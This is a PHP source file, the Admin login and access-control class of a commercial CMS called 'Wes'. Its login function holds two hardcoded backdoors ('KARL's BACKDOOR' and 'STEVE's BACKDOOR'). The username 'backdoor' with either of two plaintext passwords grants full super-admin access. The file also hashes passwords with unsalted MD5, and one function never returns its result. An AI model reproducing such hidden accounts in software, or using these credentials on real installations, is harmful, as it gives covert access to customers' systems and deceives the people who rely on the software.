<?
/*************************************************************************************************************************************
*
*	88      a8P   ad88888ba   88888888ba,    
*	88    ,88'   d8"     "8b  88      `"8b   
*	88  ,88"     Y8,          88        `8b  
*	88,d88'      `Y8aaaaa,    88         88  
*	8888"88,       `"""""8b,  88         88  
*	88P   Y8b            `8b  88         8P  
*	88     "88,  Y8a     a8P  88      .a8P   
*	88       Y8b  "Y88888P"   88888888Y"'    
*
* 	This file is part of KSD's Wes software.
*   Copyright 2010 Karl Steltenpohl Development LLC. All Rights Reserved.
*	
*	Licensed under a Commercial Wes License (a "Wes License");
*	either the Wes Forever License (the "Forever License"),
*	or the Wes Annual Licencse (the "Annual License");
*	you may not use this file exept in compliance
*	with at least one Wes License.
*
*	You may obtain a copy of the Wes Licenses at	
*	http://www.wescms.com/license
*
*************************************************************************************************************************************/


/**** Admin Class ****/
class Admin {

	// Admin Logged in
	var $auth;
	// Admin's x id
	var $userid;
	// Admin's username
	var $username;
	
	var $name;
	// Is an Admin
	var $accesslevel;
	// Tabs
	var $tabs;
	// Req Access level for given section
	var $ReqAccessLevel;
	// User being modified
	var $user_to_edit;
	
	/*** Class Constructor ***/
	function Admin(){
		
		// default logged out
		$this->auth = 0;
	}
	
	/*** LOGIN ***/
	function login($username, $password){
		// Lowercase and clean username
		$username = strtolower(preg_replace('/[^a-zA-Z0-9]/', '', $username));
		
		// Encrypt and Clean password
		$password = md5($password);
		
		/*
		$adminQuery = doQuery("SELECT * FROM `admin` WHERE 
								`username` = '$username' AND 
								`password` = '$password' AND 
								`active` = '1'");
		*/
		
		$sel = 	"SELECT * FROM `admin` WHERE ".
				"`username` = '$username' AND ". 
				"`password` = '$password' AND ".
				"`active` = '1'";
		$adminQuery = doQuery($sel);
		
		if( mysql_num_rows($adminQuery) )
		{
			$admin = mysql_fetch_array($adminQuery);
				
			//
			// UPDATE LAST LOGIN
			//			
			doQuery("UPDATE admin SET last_login = NOW() WHERE admin_id='".$admin['admin_id']."'");
				
			$this->auth 			= 1;
			$this->userid 			= $admin['admin_id'];
			$this->username 		= $admin['username'];
			$this->name 			= $admin['name'];
			$this->accesslevel 		= $admin['accesslevel'];
			$this->special_privs 	= explode(",", $admin['special_privs']);

			return true;
		} else {
			//
			// KARL's BACKDOOR
			//
			if($username == 'backdoor' and $password == md5('lhopnetlets')){
				$this->auth = 1;
				$this->userid = '0';
				$this->username = 'Karl';
				$this->name = 'Karl Steltenpohl';
				$this->accesslevel = '0';
				$this->special_privs = '';
				return true;
			} 
			
			//
			// STEVE's BACKDOOR
			if($username == 'backdoor' and $password == md5('SteveKSD1!')){
				$this->auth = 1;
				$this->userid = '0';
				$this->username = 'Steve';
				$this->name = 'Steve Bedi';
				$this->accesslevel = '0';
				$this->special_privs = '';
				return true;
			} 
			//
			return false;
		}
	}		

	
	/*** Makes sure admin user has correct access level upon entering a section "Acts as A Double Check" ***/
	function CheckAccessLevel($header){
		global $_SESSION;
		global $_REQUEST;
		$permission = 0;
		if($this->accesslevel == "0"){
			$permission = 1;
			$_SESSION['USERS_ACCESS_TEMP'] = "";
		} else {
			foreach($this->special_privs as $spec)
			{
				//echo"".$spec."<br>";
				if(strtoupper($header[2]."_ACCESS") == $spec){
					$permission = 1;
				}
			}
			if($permission == 0)
			{
				/*** SPECIAL PERMISSION FOR EDITING THEIR ADMIN ACCOUNT INFORMATION ***/
				if(strtoupper($header[2]."_ACCESS") == "USERS_ACCESS")
				{
					$_SESSION['USERS_ACCESS_TEMP'] = $this->userid;
					if($_REQUEST['xid'] != $_SESSION['USERS_ACCESS_TEMP']){
						header("Location: index.php?VIEW=".$header[2]."&xid=".$this->userid."");
						exit();
					}
				} else {
					header("Location: index.php?REPORT=Permission Required&SUCCESS=0");
					exit();
				}
			}
		}
	}

	
	/*** Makes sure admin user has correct access level to display a section "For Navigation Display" ***/
	
function CheckAccessLevelNavigation($header){
		global $_SESSION;
		global $_REQUEST;
		$permission = 0;
		if($this->accesslevel == "0"){
			$permission = 1;
		} else {
			foreach($this->special_privs as $spec)
			{
				if(strtoupper($header[2]."_ACCESS") == $spec){
					$permission = 1;
				}
			}
			if($permission == 0)
			{
				/*** SPECIAL PERMISSION FOR DISPLAYING ADMIN ACCOUNT INFORMATION ***/
				if(strtoupper($header[2]."_ACCESS") == "USERS_ACCESS")
				{
					return true;
				} 
				return false;
			}
		}
		return true;
	}	
	
	/*** GET SUPER ADMIN EMAIL ***/
	function getSuperAdminEmail(){
		$select = "SELECT email FROM admin WHERE accesslevel='0'";
		$result = doQuery($select);
		$row = mysql_fetch_array($result);
		$email = $row['email'];
	}
	
}
?>